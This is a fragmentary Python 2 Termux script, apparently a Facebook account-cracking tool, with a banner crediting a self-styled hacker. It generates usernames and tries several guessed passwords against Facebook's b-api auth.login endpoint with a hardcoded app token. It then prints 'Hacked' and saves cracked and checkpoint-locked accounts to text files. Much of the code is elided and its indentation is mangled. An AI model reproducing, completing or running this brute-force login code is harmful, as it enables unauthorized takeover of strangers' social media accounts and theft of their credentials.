...
\033[1;37m##          ## ##    ##  ##     ####    ########
\033[1;37m--------------------------------------------------
\033[1;96m➣ OWNER  (😈) MAHDI HASAN SHUVO(Bangladesh,Sylhety hacker)
\033[1;94m➣ WHATSAPP  (🔥)ASA BUT DEBO NA
\033[1;37m--------------------------------------------------
"""
back = 0
successful = []
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;92mWelcome To MAHDI Termux Commands"
	print
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;92mMAHDI(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;91mMAHDI Hacked√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;92mMAHDI(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;91mMAHDI Hacked√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
								okb = open('save/successfull.txt', 'a')
								...
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;92mMAHDI(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q['error_msg']:
											print '\x1b[1;92mMAHDI(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
											cps = open('save/checkpoint.txt', 'a')
